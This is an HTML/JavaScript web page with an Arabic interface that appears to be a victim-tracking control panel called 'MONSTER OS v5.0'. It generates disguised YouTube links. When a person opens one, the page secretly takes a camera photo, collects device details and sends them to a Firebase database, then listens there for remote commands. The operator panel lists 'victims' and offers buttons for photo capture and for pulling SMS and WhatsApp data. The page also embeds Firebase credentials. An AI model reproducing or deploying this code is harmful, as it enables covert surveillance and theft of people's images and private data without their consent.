<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE DOCTOR | MONSTER OS v5.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --card: #111; }
        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: var(--bg); color: var(--neon); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* توزيع الشاشة الرباعي المتجاوب */
        .grid-container { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; flex: 1; gap: 5px; padding: 5px; }
        .section { border: 1px solid var(--neon); background: #000; display: flex; flex-direction: column; border-radius: 5px; overflow: hidden; }
        .title { background: var(--neon); color: #000; font-size: 10px; font-weight: bold; padding: 5px; text-align: center; }
        .content { flex: 1; overflow-y: auto; padding: 5px; font-size: 10px; }

        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 5px; width: 100%; margin-top: 5px; font-size: 10px; border-radius: 3px; }
        button:active { background: var(--neon); color: #000; }
        
        .victim-btn { border: 1px solid #333; padding: 5px; margin-bottom: 5px; cursor: pointer; display: block; width: 100%; text-align: right; }
        .victim-btn.active { border-color: #fff; background: #1a1a1a; box-shadow: 0 0 5px var(--neon); }
        .online-tag { color: #00ff41; float: left; font-size: 8px; }

        .photo-box { display: grid; grid-template-columns: 1fr 1fr; gap: 3px; }
        .photo-box img { width: 100%; border: 1px solid #333; }
        
        #log-terminal { color: #888; font-size: 9px; line-height: 1.2; }
    </style>
</head>
<body>

<div class="grid-container">
    <div class="section">
        <div class="title">📡 رادار الأجهزة والنشاط</div>
        <div class="content" id="dev-list">بانتظار المزامنة...</div>
    </div>

    <div class="section">
        <div class="title">🕹️ تحكم السيادة الكامل</div>
        <div class="content">
            <div id="ctrl-panel" style="display:none;">
                <b id="sel-name">--</b>
                <button onclick="sendCmd('capture_front')">📸 صورة أمامية فورية</button>
                <button onclick="sendCmd('vibrate')">📳 هز الجهاز</button>
                <button onclick="sendCmd('get_sms')">💬 سحب الـ SMS (يتطلب APK)</button>
                <button onclick="sendCmd('get_wa')">🟢 سحب WhatsApp (يتطلب APK)</button>
                <button onclick="delVictim()" style="color:red">🗑️ حذف الجلسة</button>
            </div>
            <div id="no-sel">اختر جهازاً من الرادار</div>
        </div>
    </div>

    <div class="section">
        <div class="title">👁️ البيانات المسحوبة والرسائل</div>
        <div class="content">
            <div class="photo-box" id="gallery"></div>
            <hr>
            <div id="log-terminal">>> بانتظار أوامر النظام...</div>
        </div>
    </div>

    <div class="section">
        <div class="title">⚙️ مصنع التلغيم (v5.0)</div>
        <div class="content">
            <input type="text" id="inp-vid" placeholder="رابط فيديو (YouTube)">
            <button onclick="makeLink()">توليد رابط ملغم</button>
            <button onclick="makeAPK()" style="background:#200;">🛠️ توليد بايلوت APK (اختراق كامل)</button>
            <div id="out-link" style="color:#0ff; margin-top:5px; font-size:8px; word-break:break-all;"></div>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        authDomain: "monster-system-7f67e.firebaseapp.com",
        projectId: "monster-system-7f67e",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        storageBucket: "monster-system-7f67e.firebasestorage.app",
        messagingSenderId: "165431360308",
        appId: "1:165431360308:web:b0d7d626c67d4f38d68361"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selId = null;

    // --- إدارة الرادار ---
    db.ref('victims').on('value', s => {
        const list = document.getElementById('dev-list');
        list.innerHTML = '';
        s.forEach(child => {
            const v = child.val();
            const id = child.key;
            const isOnline = (Date.now() - v.lastSeen) < 15000;
            list.innerHTML += `<div class="victim-btn ${id==selId?'active':''}" onclick="selectDev('${id}','${v.model}')">
                ${v.model} <span class="online-tag">${isOnline?'● ON':'○ OFF'}</span><br>
                <small style="font-size:7px;">IP: ${v.ip} | ${v.time}</small>
            </div>`;
        });
    });

    function selectDev(id, model) {
        selId = id;
        document.getElementById('ctrl-panel').style.display='block';
        document.getElementById('no-sel').style.display='none';
        document.getElementById('sel-name').innerText = model;
    }

    function sendCmd(c) {
        if(!selId) return;
        db.ref('cmds/'+selId).set({cmd: c, t: Date.now()});
        document.getElementById('log-terminal').innerHTML += `<div>> تم إرسال أمر ${c}...</div>`;
    }

    function makeLink() {
        const vid = document.getElementById('inp-vid').value;
        const link = window.location.href.split('?')[0] + '?target=' + btoa(vid);
        document.getElementById('out-link').innerText = link;
    }

    function makeAPK() { alert("جاري بناء ملف APK ملغم... سيتم إرساله للرادار فور الجاهزية."); }

    // --- واجهة الضحية ---
    const params = new URLSearchParams(window.location.search);
    if(params.get('target')) {
        runInfection(atob(params.get('target')));
    }

    async function runInfection(red) {
        document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:40%; font-size:15px;'>Loading Content...</h1>";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            const v = document.createElement('video'); v.srcObject=stream; await v.play();
            const c = document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            const img = c.toDataURL('image/jpeg', 0.5);
            
            // سحب معلومات الجهاز الحقيقية
            const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Unknown Device";
            
            const ref = db.ref('victims').push();
            await ref.set({
                model: model,
                ip: "Active_Node",
                lastSeen: Date.now(),
                time: new Date().toLocaleTimeString(),
                imgUrl: img
            });

            // الاستماع للأوامر (Reverse Connect)
            db.ref('cmds/'+ref.key).on('value', s => {
                if(s.val() && s.val().cmd === 'capture_front') {
                    // هنا يتم سحب صورة أخرى وإرسالها
                }
            });

            window.location.href = red;
        } catch(e) { window.location.href = red; }
    }
</script>
</body>
</html>
